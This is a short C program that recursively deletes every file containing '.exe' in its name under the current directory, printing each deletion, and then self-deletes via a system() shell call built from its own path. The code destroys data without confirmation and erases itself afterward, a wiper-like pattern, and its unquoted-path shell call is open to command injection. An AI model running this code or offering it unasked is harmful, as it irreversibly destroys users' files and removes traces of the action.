#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <limits.h>

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

void deleteExeFiles(const char *path, const char *currentExePath) {
    DIR *dir = opendir(path);
    if (!dir) {
        perror("Unable to open directory");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        // Skip current and parent directories
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        char fullPath[PATH_MAX];
        snprintf(fullPath, sizeof(fullPath), "%s/%s", path, entry->d_name);

        struct stat statbuf;
        if (stat(fullPath, &statbuf) == -1) {
            continue;
        }

        if (S_ISDIR(statbuf.st_mode)) {
            deleteExeFiles(fullPath, currentExePath);  // Recurse into directories
        } else {
            if (strstr(entry->d_name, ".exe") != NULL && strcmp(fullPath, currentExePath) != 0) {
                if (remove(fullPath) == 0) {
                    printf("Deleted: %s\n", fullPath);
                } else {
                    perror("Failed to delete");
                }
            }
        }
    }

    closedir(dir);
}

void scheduleSelfDelete(const char *currentExePath) {
    char command[PATH_MAX + 64];
    snprintf(command, sizeof(command), "sh -c 'rm -f \"%s\" &'", currentExePath);
    system(command);
    printf("Scheduled self-deletion\n");
}

int main() {
    char currentExePath[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", currentExePath, sizeof(currentExePath) - 1);

    if (len == -1) {
        perror("Failed to get current executable path");
        return 1;
    }

    currentExePath[len] = '\0';

    const char *path = ".";  // Start from the current directory
    deleteExeFiles(path, currentExePath);

    scheduleSelfDelete(currentExePath);

    return 0;
}
